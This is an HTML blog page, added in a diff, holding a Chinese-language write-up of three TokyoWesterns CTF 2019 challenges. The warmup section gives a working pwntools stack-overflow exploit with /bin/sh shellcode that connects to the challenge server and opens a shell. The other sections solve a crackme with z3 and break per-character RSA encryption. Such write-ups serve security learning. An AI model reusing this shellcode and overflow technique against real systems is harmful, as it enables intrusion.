@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="聂小涛的博客">
+    <meta name="keyword" content="腾讯">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        TokyoWesternsCTF 2019 writeup - pumpkin9&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> Never give up </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>pumpkin9</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup"><span class="toc-text">warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-crackme"><span class="toc-text">easy_crackme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#check1"><span class="toc-text">check1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check2"><span class="toc-text">check2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check3"><span class="toc-text">check3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check4"><span class="toc-text">check4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check5"><span class="toc-text">check5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check6"><span class="toc-text">check6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#real-baby-rsa"><span class="toc-text">real baby rsa</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> Never give up </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        TokyoWesternsCTF 2019 writeup
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-09-02 12:37:24</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#write up" title="write up">write up</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <p>tcl 做了三道签到题目</p>
+<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>没有任何保护的栈溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">addr=<span class="number">0x0000000000601A00</span></span><br><span class="line"></span><br><span class="line">buf=<span class="number">0x00007FFE0740F240</span></span><br><span class="line">ret=<span class="number">0x00007FFE0740F348</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process('./pwn')</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io=remote(<span class="string">'nothing.chal.ctf.westerns.tokyo'</span>,<span class="number">10001</span>)</span><br><span class="line">io.sendline((ret-buf)*<span class="string">'a'</span>+p64(<span class="number">0x0000000000400773</span>)+p64(addr)+p64(elf.plt[<span class="string">'gets'</span>])+p64(addr))</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="easy-crackme"><a href="#easy-crackme" class="headerlink" title="easy_crackme"></a>easy_crackme</h2><p>这道题目耗时间比较长<br>最后用z3 一个一个进行约束即可</p>
+<h3 id="check1"><a href="#check1" class="headerlink" title="check1"></a>check1</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v46 = '76543210';</span><br><span class="line">v47 = 'fedcba98';</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="built_in">strchr</span>(s, *((<span class="keyword">char</span> *)&amp;v46 + i)); j; j = <span class="built_in">strchr</span>(j + <span class="number">1</span>, *((<span class="keyword">char</span> *)&amp;v46 + i)) )</span><br><span class="line">    ++*((_DWORD *)&amp;s1 + i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;s1, &amp;unk_400F00, <span class="number">0x40</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>判断字符出现次数</p>
+<h3 id="check2"><a href="#check2" class="headerlink" title="check2"></a>check2</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">v21 = <span class="number">0L</span>L;</span><br><span class="line">    v22 = <span class="number">0L</span>L;</span><br><span class="line">    v23 = <span class="number">0L</span>L;</span><br><span class="line">    v24 = <span class="number">0L</span>L;</span><br><span class="line">    v25 = <span class="number">0L</span>L;</span><br><span class="line">    v26 = <span class="number">0L</span>L;</span><br><span class="line">    v27 = <span class="number">0L</span>L;</span><br><span class="line">    v28 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">7</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">0</span>;</span><br><span class="line">      v11 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">3</span>; ++l )                <span class="comment">// 遍历 &#123;***&#125; 的内容</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5 = s[<span class="number">4</span> * k + <span class="number">6</span> + l];</span><br><span class="line">        v10 += v5;</span><br><span class="line">        v11 ^= v5;</span><br><span class="line">      &#125;</span><br><span class="line">      *((_DWORD *)&amp;v21 + k) = v10;              <span class="comment">// 四个一组的和</span></span><br><span class="line">      *((_DWORD *)&amp;v25 + k) = v11;              <span class="comment">// 四个一组异或的值</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="check3"><a href="#check3" class="headerlink" title="check3"></a>check3</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">v29 = <span class="number">0L</span>L;</span><br><span class="line">v30 = <span class="number">0L</span>L;</span><br><span class="line">v31 = <span class="number">0L</span>L;</span><br><span class="line">v32 = <span class="number">0L</span>L;</span><br><span class="line">v33 = <span class="number">0L</span>L;</span><br><span class="line">v34 = <span class="number">0L</span>L;</span><br><span class="line">v35 = <span class="number">0L</span>L;</span><br><span class="line">v36 = <span class="number">0L</span>L;</span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">7</span>; ++m )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">3</span>; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = s[<span class="number">8</span> * n + <span class="number">6</span> + m];</span><br><span class="line">    v14 += v6;</span><br><span class="line">    v15 ^= v6;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_DWORD *)&amp;v29 + m) = v14;</span><br><span class="line">  *((_DWORD *)&amp;v33 + m) = v15;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;v21, &amp;unk_400F40, <span class="number">0x20</span>uLL) || <span class="built_in">memcmp</span>(&amp;v25, &amp;unk_400F60, <span class="number">0x20</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;v29, &amp;unk_400FA0, <span class="number">0x20</span>uLL) || <span class="built_in">memcmp</span>(&amp;v33, &amp;unk_400F80, <span class="number">0x20</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="check4"><a href="#check4" class="headerlink" title="check4"></a>check4</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(v45, <span class="number">0</span>, <span class="keyword">sizeof</span>(v45));</span><br><span class="line"><span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">31</span>; ++ii )</span><br><span class="line">&#123;</span><br><span class="line">  v7 = s[ii + <span class="number">6</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v7 &lt;= <span class="number">0x2F</span> || v7 &gt; <span class="number">0x39</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0x60</span> || v7 &gt; <span class="number">0x66</span> )</span><br><span class="line">      v45[ii] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v45[ii] = <span class="number">0x80</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v45[ii] = <span class="number">0xFF</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v45, &amp;unk_400FC0, <span class="number">0x80</span>uLL) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="check5"><a href="#check5" class="headerlink" title="check5"></a>check5</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v18 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt;= <span class="number">15</span>; ++jj )</span><br><span class="line">      v18 += s[<span class="number">2</span> * (jj + <span class="number">3</span>)];</span><br><span class="line">    <span class="keyword">if</span> ( v18 != <span class="number">1160</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="check6"><a href="#check6" class="headerlink" title="check6"></a>check6</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( s[<span class="number">37</span>] != <span class="number">0x35</span> || s[<span class="number">7</span>] != <span class="number">102</span> || s[<span class="number">11</span>] != <span class="number">0x38</span> || s[<span class="number">12</span>] != <span class="number">0x37</span> || s[<span class="number">23</span>] != <span class="number">0x32</span> || s[<span class="number">31</span>] != <span class="number">0x34</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Correct: %s\n"</span>, s, a2);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解题脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !user/bin/python2.7</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">"a%d"</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>)]</span><br><span class="line">sum1 = [<span class="number">0x15E</span>, <span class="number">0x0DA</span>, <span class="number">0x12F</span>, <span class="number">0x131</span>, <span class="number">0x100</span>, <span class="number">0x131</span>, <span class="number">0x0FB</span>, <span class="number">0x102</span>]</span><br><span class="line">xor1 = [<span class="number">0x52</span>, <span class="number">0x0C</span>, <span class="number">1</span>, <span class="number">0x0F</span>, <span class="number">0x5C</span>, <span class="number">5</span>, <span class="number">0x53</span>, <span class="number">0x58</span>]</span><br><span class="line">sum2 = [<span class="number">0x129</span>, <span class="number">0x103</span>, <span class="number">0x12B</span>, <span class="number">0x131</span>, <span class="number">0x135</span>, <span class="number">0x10B</span>, <span class="number">0x0FF</span>, <span class="number">0x0FF</span>]</span><br><span class="line">xor2 = [<span class="number">1</span>, <span class="number">0x57</span>, <span class="number">7</span>, <span class="number">0x0D</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x51</span>, <span class="number">0x51</span>]</span><br><span class="line">cnt = [<span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">memcmp = [<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>]</span><br><span class="line">d = <span class="string">"0123456789abcdef"</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(0,16):</span></span><br><span class="line"><span class="string">	s.add(str(flag).count(str(ord(d[i])))==cnt[i])</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">	<span class="keyword">if</span> memcmp[j] == <span class="number">0x80</span>:</span><br><span class="line">		s.add(flag[j]&gt; <span class="number">0x60</span>)</span><br><span class="line">		s.add(flag[j]&lt;=<span class="number">0x66</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		s.add(flag[j]&lt;=<span class="number">0x39</span>)</span><br><span class="line">		s.add(flag[j]&gt; <span class="number">0x2f</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flag:</span><br><span class="line">	s.add(<span class="number">0x30</span>&lt;=x)</span><br><span class="line">	s.add(<span class="number">0x67</span>&gt;x)</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">1</span>]==<span class="number">102</span>)</span><br><span class="line">s.add(flag[<span class="number">5</span>]==<span class="number">0x38</span>)</span><br><span class="line">s.add(flag[<span class="number">6</span>]==<span class="number">0x37</span>)</span><br><span class="line">s.add(flag[<span class="number">17</span>]==<span class="number">0x32</span>)</span><br><span class="line">s.add(flag[<span class="number">25</span>]==<span class="number">0x34</span>)</span><br><span class="line">s.add(flag[<span class="number">31</span>]==<span class="number">0x35</span>)</span><br><span class="line"><span class="comment">#for i in range(len())</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">	s.add(flag[i]!=<span class="number">51</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">4</span>):</span><br><span class="line">	s.add(flag[i]+flag[i+<span class="number">1</span>]+flag[i+<span class="number">2</span>]+flag[i+<span class="number">3</span>]==sum1[i/<span class="number">4</span>])</span><br><span class="line">	s.add(flag[i]^flag[i+<span class="number">1</span>]^flag[i+<span class="number">2</span>]^flag[i+<span class="number">3</span>]==xor1[i/<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">	s.add(flag[i]+flag[i+<span class="number">8</span>]+flag[i+<span class="number">16</span>]+flag[i+<span class="number">24</span>]==sum2[i])</span><br><span class="line">	s.add(flag[i]^flag[i+<span class="number">8</span>]^flag[i+<span class="number">16</span>]^flag[i+<span class="number">24</span>]==xor2[i])</span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>,<span class="number">2</span>):</span><br><span class="line">	sum += flag[i]</span><br><span class="line">s.add(sum == <span class="number">1160</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[-] check sat ·····"</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">	m = s.model()</span><br><span class="line">	<span class="keyword">print</span> m</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"[+] print flag ·····"</span></span><br><span class="line">	kk = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">		kk +=  chr(int(<span class="string">"%s"</span> % (m[flag[i]])))</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"TWCTF&#123;"</span>+kk+<span class="string">"&#125;"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"[+] False     ·····"</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="real-baby-rsa"><a href="#real-baby-rsa" class="headerlink" title="real baby rsa"></a>real baby rsa</h2><p>加密是逐个字符加密<br>我们可以加密所有可见字符<br>然后对比出flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">'TWCTF&#123;CENSORED&#125;'</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="comment"># Public Parameters</span></span><br><span class="line">N = <span class="number">36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"># Encrypt the flag!</span></span><br><span class="line"><span class="string">for char in flag:</span></span><br><span class="line"><span class="string">    print(pow(ord(char), e, N))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">dic = <span class="string">"TWCTF&#125;&#123;QWERTYUIOPASDFGHJKLZXCVBNM?/&gt;&lt;.,:;\"\'[]qwertyuiopasdfghjklzxcvbnm0123456789!@#$%^&amp;*()_-+=~`"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'output'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">		xx = line.rstrip()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">			zz = str(pow(ord(i),e,N))</span><br><span class="line">			<span class="keyword">if</span> xx[:<span class="number">600</span>] == zz[:<span class="number">600</span>]:</span><br><span class="line">				flag += i</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+
+
+        
+            <div class="donate-container">
+    <div class="donate-button">
+        <button id="donate-button">赞赏</button>
+    </div>
+    <div class="donate-img-container hide" id="donate-img-container">
+        <img id="donate-img" src="" data-src="/img/donate.jpg">
+        <p> 感谢鼓励 </p>
+    </div>
+</div>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="https://www.10000h.top"></a></span>
+        <span>/</span>
+        
+        <span><a href="https://niexiaotao.com"></a></span>
+        <span>/</span>
+        
+        <span><a href="#"></a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
